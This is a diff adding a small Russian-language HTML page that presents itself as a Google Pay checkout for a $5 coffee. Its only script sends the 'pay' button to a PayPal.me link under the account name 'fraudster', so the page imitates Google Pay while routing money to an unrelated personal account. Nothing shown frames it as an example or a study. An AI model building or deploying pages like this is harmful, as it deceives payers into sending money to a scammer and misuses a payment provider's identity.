@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Pay</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        .box { border: 1px solid #ddd; padding: 20px; display: inline-block; }
+        .button { background: #4285F4; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Оплата через Google Pay</h2>
+    <div class="box">
+        <p>Кофе: $5</p>
+        <button class="button" onclick="payNow()">Оплатить</button>
+    </div>
+
+    <script>
+        function payNow() {
+            window.location.href = "https://paypal.me/fraudster/5usd";
+        }
+    </script>
+</body>
+</html>
